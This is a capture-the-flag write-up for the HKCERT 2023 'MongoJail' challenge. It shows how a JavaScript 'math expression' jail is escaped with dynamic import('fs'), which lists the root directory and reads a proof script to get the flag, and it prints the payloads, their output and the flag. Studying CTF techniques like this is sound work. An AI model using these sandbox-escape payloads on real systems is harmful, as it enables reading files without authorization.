# MongoJail

https://hackmd.io/@blackb6a/hkcert-ctf-2023-ii-en-4e6150a89a1ff32c#%E7%8D%84%E9%96%80%E7%96%86--MongoJail-Pwn <br/>
by following the guide and looking into the `JavaScript reference` <br/>
we can see here is an useful built-in function called `import()` which can import libraries <br/>
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/import

<details>
<summary>example</summary>

```js
import("/my-module.js").then((mod2) => {
  console.log(mod === mod2); // true
});
```

</details>

then, we execute this command in the jail to load the `fs` library and list the root directory

```js
import('fs').then(fs => {return fs.readdirSync('/')})
```

```
Enter math expression:
import('fs').then(fs => {return fs.readdirSync('/')})
[
  'bin',
  'boot',
  'data',
  'dev',
  'docker-entrypoint-initdb.d',
  'etc',
  'home',
  'js-yaml.js',
  'lib',
  'lib32',
  'lib64',
  'libx32',
  'media',
  'mnt',
  'opt',
  'proc',
  'proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh',
  'root',
  'run',
  'sbin',
  'srv',
  'sys',
  'tmp',
  'usr',
  'var'
]
```

it can be clearly seen that there is a `proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh` file <br/>
read it!

```js
import('fs').then(fs => {return fs.readFileSync('/proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh').toString()})
```

```
Enter math expression:
import('fs').then(fs => {return fs.readFileSync('/proof_CBg0IiyEoIHTxFLZEaB4mKma9TlC1UmFCsVdnyuH.sh').toString()})
#!/bin/sh
echo hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}
```

you get the flag!😋

flag: hkcert23{WolframAlpha_L0v3z_Shibuya-Yuri_Harajuku-Furi}
